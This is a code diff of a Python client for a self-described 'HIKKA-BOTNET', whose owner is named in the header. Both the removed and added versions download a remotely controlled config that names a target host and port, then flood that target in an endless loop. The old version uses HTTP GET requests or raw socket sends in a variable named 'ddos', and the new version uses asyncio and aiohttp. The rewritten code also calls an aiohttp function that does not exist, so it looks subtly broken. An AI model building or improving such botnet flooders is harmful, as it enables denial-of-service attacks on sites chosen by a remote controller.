@@ -5,30 +5,24 @@ HIKKA-BOTNET, если вы участвуете в
 # @hotdrify <-- OWNER
 #[+]=================================[+]#
 import json
-import requests as r
-import random
-import socket
+import asyncio
+import aiohttp
 
-cfg = r.get("https://raw.githubusercontent.com/HotDrify/hikka.modules/main/assets/config.json")
-config = json.loads(cfg.text)
-
-ip = config["site"]
-port = config["port"]
-message = config["message"].encode()
-type = config["type"]
-
-if type == "GET":
-    try:
+async def get(ip, port):
+    async with aiohttp.ClientSession() as session:
         while True:
-            r.get(f"{ip}:{port}")
-    except:
-        pass
-elif type == "socket":
-    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        while True:
-            ddos.connect((ip, port))
-            ddos.send( message )
-            ddos.close()
-    except:
-        pass
+            async with session.get(f"http://{ip}:{port}") as response:
+                await response.read()
+
+async def main():
+    cfg = await aiohttp.get("https://raw.githubusercontent.com/HotDrify/hikka.modules/main/assets/config.json")
+    config = json.loads(await cfg.text())
+
+    ip = config["site"]
+    port = config["port"]
+    type = config["type"]
+
+    if type == "GET":
+        await get(ip, port)
+
+asyncio.run(main())
